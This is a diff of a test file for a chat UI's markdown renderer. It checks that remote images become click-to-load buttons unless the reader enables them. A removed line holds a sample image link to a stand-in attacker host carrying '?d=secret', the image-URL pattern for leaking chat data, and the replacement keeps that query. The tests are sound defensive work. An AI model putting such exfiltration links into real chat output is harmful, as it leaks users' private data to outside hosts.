@@ -1,4 +1,4 @@
-import { ChatMarkdown } from "@rakazo/chat-ui/web";
+import { ChatMarkdown, RemoteImagesContext } from "@rakazo/chat-ui/web";
 import { renderToStaticMarkup } from "react-dom/server";
 import { describe, expect, it } from "vitest";
 
@@ -36,23 +36,47 @@ describe("ChatMarkdown", () => {
     expect(html).toContain('<a href="https://example.test" target="_blank"');
   });
 
-  it("shows remote markdown images as links and relative ones as text, without loading them", () => {
+  it("shows remote images as load buttons and relative ones as text, without loading them", () => {
     const html = renderToStaticMarkup(
       <ChatMarkdown>
         {
-          '![chart](https://attacker.example.test/p.gif?d=secret "Q3 revenue") ![logo](/api/v1/p.gif) ![](./p.gif)'
+          '![chart](https://images.example.test/p.gif?d=secret "Q3 revenue") ![logo](/api/v1/p.gif) ![](./p.gif)'
         }
       </ChatMarkdown>,
     );
 
     expect(html).not.toContain("<img");
+    expect(html).not.toContain("images.example.test/p.gif");
     expect(html).toContain(
-      '<a href="https://attacker.example.test/p.gif?d=secret" title="Q3 revenue" target="_blank" rel="noreferrer noopener">chart</a>',
+      '<button type="button" class="rk-chat-markdown-image" title="Q3 revenue">',
+    );
+    expect(html).toContain(
+      '<span>chart</span><span class="rk-chat-markdown-image-host">images.example.test</span></button>',
     );
     expect(html).not.toContain('href="/api/v1/p.gif"');
     expect(html).not.toContain('href="./p.gif"');
     expect(html).toContain("logo");
     expect(html).toContain("./p.gif");
+  });
+
+  it("loads remote images at once, without a referrer, when the reader turned that on", () => {
+    const html = renderToStaticMarkup(
+      <RemoteImagesContext.Provider value={true}>
+        <ChatMarkdown>
+          {
+            "![chart](https://images.example.test/auto.png) [![build](https://badge.example.test/auto.svg)](https://ci.example.test/run)"
+          }
+        </ChatMarkdown>
+      </RemoteImagesContext.Provider>,
+    );
+
+    expect(html).toContain(
+      '<img src="https://images.example.test/auto.png" alt="chart" loading="lazy" referrerPolicy="no-referrer"/>',
+    );
+    expect(html).toContain(
+      '<a href="https://ci.example.test/run" target="_blank" rel="noreferrer noopener"><img src="https://badge.example.test/auto.svg"',
+    );
+    expect(html).not.toContain("<button");
   });
 
   it("never puts an unsafe image source into an attribute", () => {
@@ -69,7 +93,7 @@ describe("ChatMarkdown", () => {
     expect(html).toContain("p");
   });
 
-  it("keeps an image inside a link as that link's text", () => {
+  it("shows an image inside an open link as a placeholder that does not request it", () => {
     const html = renderToStaticMarkup(
       <ChatMarkdown>
         {"[![build](https://badge.example.test/b.svg)](https://ci.example.test/run)"}
@@ -77,10 +101,13 @@ describe("ChatMarkdown", () => {
     );
 
     expect(html).not.toContain("<img");
-    expect(html).not.toContain("badge.example.test");
-    expect(html).toContain(
-      '<a href="https://ci.example.test/run" target="_blank" rel="noreferrer noopener">build</a>',
-    );
+    expect(html).not.toContain("badge.example.test/b.svg");
+    const anchor = html.match(/<a\b[^>]*>[\s\S]*?<\/a>/)?.[0] ?? "";
+    expect(anchor).not.toContain("<button");
+    expect(anchor).toContain("ci.example.test");
+    expect(html).toContain('class="rk-chat-markdown-image"');
+    expect(html).toContain(">build</span>");
+    expect(html).toContain("badge.example.test");
   });
 
   it("keeps an image inside a rejected link as plain text", () => {
